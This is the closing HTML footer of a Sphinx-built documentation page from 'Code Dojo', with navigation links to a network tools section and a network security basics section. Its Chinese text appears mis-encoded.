</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="é¡µè„š">
        <a href="index.html" class="btn btn-neutral float-left" title="ç½‘ç»œå·¥å…·å¤§å…¨" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> ä¸Šä¸€é¡µ</a>
        <a href="../11-network-security/index.html" class="btn btn-neutral float-right" title="ç½‘ç»œå®‰å…¨åŸºç¡€" accesskey="n" rel="next">ä¸‹ä¸€é¡µ <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; ç‰ˆæƒæ‰€æœ‰ 2025, Code Dojoã€‚</p>
  </div>

  åˆ©ç”¨ <a href="https://www.sphinx-doc.org/">Sphinx</a> æ„å»ºï¼Œä½¿ç”¨çš„ 
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">ä¸»é¢˜</a>
    ç”± <a href="https://readthedocs.org">Read the Docs</a> å¼€å‘.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>